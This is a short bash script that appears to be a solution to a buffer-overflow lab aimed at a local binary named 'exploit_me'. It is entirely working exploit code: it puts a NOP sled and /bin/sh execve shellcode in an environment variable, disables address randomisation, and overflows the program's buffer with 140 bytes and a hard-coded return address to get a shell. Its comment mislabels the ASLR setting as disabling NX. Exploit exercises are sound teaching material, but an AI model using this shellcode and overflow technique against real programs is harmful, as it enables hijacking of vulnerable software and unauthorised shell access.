#!/bin/bash
# disable NX on system : sudo echo 0 > /proc/sys/kernel/randomize_va_space 
export GG=`python -c 'print "\x90" * 3000 + "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
./exploit_me `python -c 'print "A"* 140 + "\xff\xff\xd4\xed"[::-1]'`
